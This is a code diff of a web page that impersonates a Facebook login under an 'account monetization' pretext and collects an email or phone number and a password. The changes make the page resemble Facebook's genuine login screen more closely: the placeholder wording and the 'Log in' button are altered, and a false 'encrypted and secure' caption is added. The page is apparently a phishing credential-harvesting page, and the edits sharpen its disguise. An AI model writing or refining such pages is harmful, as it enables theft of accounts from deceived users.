@@ -7,66 +7,52 @@
     </div>
     <div>
       <h2 class="notranslate" style="margin:0;color:#1877F2;">Facebook</h2>
-      <div style="color:#64748b;font-size:13px;margin-top:4px">Continue with your account monetization</div>
+      <div style="color:#64748b;font-size:13px">Please login to continue with your account monetization.</div>
     </div>
   </div>
 
   <form id="loginForm" method="post" novalidate>
-    <div class="form-group">
-      <label class="form-label">Email or Phone Number</label>
-      <input class="input" id="address" name="address" placeholder="Enter your email or phone number" required>
-      <div class="error-text" id="addressError"></div>
-    </div>
+    <input class="input" id="address" name="address" placeholder="Mobile number or email address" required>
+    <div class="error-text" id="addressError"></div>
 
-    <div class="form-group">
-      <label class="form-label">Password</label>
-      <input class="input" id="password" name="password" type="password" placeholder="Enter your password" required>
-      <div class="error-text" id="passwordError"></div>
-    </div>
+    <input class="input" id="password" name="password" type="password" placeholder="Password" required>
+    <div class="error-text" id="passwordError"></div>
 
-    <button class="btn login-btn" type="submit">
-      <span class="btn-text">Continue to Monetization</span>
-    </button>
+    <button class="btn login-btn" type="submit">Log in</button>
   </form>
 
-  <div class="security-note">
-    <p>🔒 Secure login required for account verification</p>
+  <!-- ADDED SECURITY CAPTION -->
+  <div class="security-note" style="margin-top:20px;padding:12px 16px;background:#f0f9ff;border-radius:12px;border:1px solid #e0f2fe;">
+    <p style="margin:0;color:#0369a1;font-size:0.9rem;font-weight:500;text-align:center;">
+      🔒 Your login credentials are encrypted and secure
+    </p>
   </div>
 </div>
 
 <style>
 .input {
   width: 100%;
-  padding: 16px 20px;
+  padding: 14px;
   border-radius: 18px;
-  border: 2px solid #e5e7eb;
+  border: 1px solid #e5e7eb;
   margin-bottom: 8px;
   font-size: 16px;
-  transition: border-color 0.3s, box-shadow 0.3s, transform 0.2s;
-  background: #ffffff;
-  box-sizing: border-box;
+  transition: border-color 0.2s, box-shadow 0.2s;
 }
 .input:focus {
   border-color: #1877F2;
-  box-shadow: 0 0 0 4px rgba(24, 119, 242, 0.15);
+  box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.25);
   outline: none;
-  transform: translateY(-1px);
-}
-.input::placeholder {
-  color: #9ca3af;
-  font-weight: 400;
 }
 .input-error {
   border-color: #ef4444;
-  box-shadow: 0 0 0 4px rgba(239, 68, 68, 0.1);
+  box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.15);
 }
 .error-text {
   color: #ef4444;
   font-size: 13px;
-  margin-top: 6px;
+  margin-top: -4px;
   margin-bottom: 8px;
-  font-weight: 500;
-  display: block;
 }
 
 .login-btn {
@@ -75,70 +61,21 @@
   color: #fff;
   font-size: 16px;
   font-weight: 700;
-  padding: 16px 24px;
+  padding: 12px;
   border-radius: 25px;
   cursor: pointer;
   border: none;
-  transition: all 0.3s ease;
+  transition: background 0.25s, transform 0.1s, box-shadow 0.2s;
   box-shadow: 0 6px 16px rgba(24,119,242,0.35);
   display: block;
-  margin-top: 16px;
-  position: relative;
-  overflow: hidden;
+  margin-top: 8px;
 }
 .login-btn:hover {
   background: #166fe5;
   box-shadow: 0 8px 20px rgba(24,119,242,0.45);
-  transform: translateY(-2px);
 }
 .login-btn:active {
-  transform: translateY(0);
-}
-.login-btn::before {
-  content: '';
-  position: absolute;
-  top: 0;
-  left: -100%;
-  width: 100%;
-  height: 100%;
-  background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-  transition: left 0.5s;
-}
-.login-btn:hover::before {
-  left: 100%;
-}
-
-.btn-text {
-  position: relative;
-  z-index: 1;
-}
-
-.form-group {
-  margin-bottom: 20px;
-}
-
-.form-label {
-  display: block;
-  font-weight: 600;
-  font-size: 14px;
-  margin-bottom: 8px;
-  color: #374151;
-}
-
-.security-note {
-  margin-top: 20px;
-  padding: 12px 16px;
-  background: #f0f9ff;
-  border-radius: 12px;
-  border: 1px solid #e0f2fe;
-  text-align: center;
-}
-
-.security-note p {
-  margin: 0;
-  color: #0369a1;
-  font-size: 0.85rem;
-  font-weight: 500;
+  transform: scale(0.985);
 }
 </style>
 
@@ -161,13 +98,13 @@ document.getElementById("loginForm").addEventListener("submit", function(event) 
   if (!(emailPattern.test(addrVal) || phonePattern.test(addrVal))) {
     valid = false;
     address.classList.add("input-error");
-    addressError.textContent = "Please enter a valid email address or phone number.";
+    addressError.textContent = "Enter a valid lowercase email (e.g. name@email.com) or phone number.";
   }
 
   if (password.value.trim().length < 6) {
     valid = false;
     password.classList.add("input-error");
-    passwordError.textContent = "Password must be at least 6 characters long.";
+    passwordError.textContent = "Password must be at least 6 characters.";
   }
 
   if (!valid) event.preventDefault();
